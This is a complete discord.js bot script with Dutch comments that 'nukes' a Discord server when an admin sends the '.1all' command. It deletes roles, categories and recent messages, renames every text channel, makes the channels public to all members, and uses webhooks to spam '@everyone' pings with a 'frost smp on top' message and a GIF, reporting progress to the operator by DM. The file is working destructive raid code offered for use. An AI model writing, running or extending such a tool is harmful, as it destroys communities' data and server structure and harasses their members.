import { Client, GatewayIntentBits, PermissionsBitField, ChannelType } from 'discord.js';
import http from 'http';

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const PREFIX = '.1';
const GIF_URL = "https://cdn.discordapp.com/attachments/1522698849276268634/1522701428466909326/togif.gif";
const WEBHOOK_NAME = "idk who I am";
const WEBHOOK_AVATAR = "https://pfps.gg/pfp/3433-aesthetic-scary";

http.createServer((req, res) => res.end('Bot running!')).listen(3000);

client.once('ready', () => {
    console.log(`✅ Bot is online als ${client.user.tag}`);
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.toLowerCase().startsWith('.1all')) return;

    const args = message.content.slice(5).trim().split(/ +/);
    const spamAmount = parseInt(args[0]) || 50;

    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply("❌ Administrator rechten nodig!").then(m => setTimeout(() => m.delete().catch(() => {}), 2000));
    }

    message.delete().catch(() => {});

    try {
        await message.author.send(`⚠️ **NUKE START** ⚠️\nSpam: ${spamAmount}x "frost smp on top"`);
    } catch {}

    let cancelled = false;
    const collector = message.channel.createMessageCollector({
        filter: m => m.author.id === message.author.id && m.content.toLowerCase() === '.1cancel',
        time: 3000
    });
    collector.on('collect', () => cancelled = true);

    await new Promise(r => setTimeout(r, 3000));
    if (cancelled) return;

    // Rollen verwijderen
    for (const role of message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).values()) {
        try { await role.delete(); } catch {}
    }

    // Categorieën verwijderen
    for (const cat of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildCategory).values()) {
        try { await cat.delete(); } catch {}
    }

    // Channels verwerken + spam
    const textChannels = Array.from(message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).values());
    let processed = 0;

    const promises = textChannels.map(async (channel) => {
        try {
            // Oude berichten wissen
            await channel.bulkDelete(100, true).catch(() => {});

            // Hernoemen + zichtbaar maken
            await channel.setName("Finnson the goat");

            await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                ViewChannel: true,
                SendMessages: true,
                ReadMessageHistory: true
            }).catch(() => {});

            // Webhook spam met "frost smp on top"
            const webhook = await channel.createWebhook({
                name: WEBHOOK_NAME,
                avatar: WEBHOOK_AVATAR
            }).catch(() => null);

            if (webhook) {
                for (let i = 0; i < spamAmount; i++) {
                    await webhook.send({
                        content: `frost smp on top\n@everyone\n${GIF_URL}`,
                        username: WEBHOOK_NAME,
                        avatarURL: WEBHOOK_AVATAR
                    }).catch(() => {});
                }
                webhook.delete().catch(() => {});
            }

            processed++;
        } catch (err) {}
    });

    await Promise.all(promises);

    try {
        await message.author.send(`[DONE] ${processed} channels changed`);
    } catch {}
});

client.login(process.env.TOKEN);
